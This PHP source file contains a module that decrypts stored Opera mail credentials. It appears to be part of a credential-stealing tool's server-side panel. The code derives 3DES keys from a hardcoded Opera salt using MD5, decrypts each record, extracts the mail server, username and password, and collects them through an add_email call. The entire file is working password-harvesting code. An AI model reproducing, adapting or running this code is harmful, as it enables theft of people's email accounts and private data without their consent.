<?php
class Module_operamail extends Module_
{
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$Stream = new Stream($Data);
			$OperaSalt = "837DFC0F8EB3E86973AFFF";
			$Stream->GetDWORD(FALSE); //v
			
			$Server = $User = $Pass = $Prot = '';
			$Start = "opera:mail/";
			$Cnt = 0;
			while (TRUE)
			{
				if($Stream->GetDataLen() <= $Stream->GetDataPos() + 8)
					break;
				
				$Stream->FindBytes(hex2bin("00000008"), 4);
				
				$BlockLen = $Stream->GetDWORD(FALSE);
				$BlockDes = $Stream->GetSTR($Stream->GetDWORD(FALSE));
				$DataLen  = $Stream->GetDWORD(FALSE);
				
				$DESKey1 = md5(hex2bin($OperaSalt) . $BlockDes, TRUE);
				$DESKey2 = md5($DESKey1 . hex2bin($OperaSalt) . $BlockDes, TRUE);
				
				$KEY = substr($DESKey1, 0, 8) . substr($DESKey1, 8, 8) . substr($DESKey2, 0, 8);
				$IV_ = substr($DESKey2, 8, 8);

				$Data = iconv('UTF-16LE', 'UTF-8', substr(mcrypt_decrypt(MCRYPT_3DES, $KEY, $Stream->GetSTR($DataLen), MCRYPT_MODE_CBC, $IV_), 0, $DataLen));

				if($Data[0] == ord(8) || $Data[0] == ord(0))
				{
					
				}
				else
				{
					$Data = FixNonPrintable($Data);
					if(strpos($Data, $Start) !== false)
					{
						$Cnt = 1;
					}
					
					switch($Cnt)
					{
						case 1:
						$Server = str_replace($Start, "", $Data);
						$Cnt++;
						break;
						case 2:
						$User = $Data;
						$Cnt++;
						break;
						case 3:
						$Pass = $Data;
						
						if(strstr($Server, "smtp"))
						{
							$this->add_email($User, 'smtp', $Server, 0, $User, $Pass);
						}
						else if(strstr($Server, "pop"))
						{
							$this->add_email($User, 'smtp', $Server, 0, $User, $Pass);
						}
						else if(strstr($Server, "imap"))
							$this->add_email($User, 'imap', $Server, 0, $User, $Pass);
						else
							$this->add_email($User, '', $Server, 0, $User, $Pass);
						$Server = $User = $Pass = $Prot = '';
						$Cnt = 0;
						break;
					}
				}
			}
			$stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
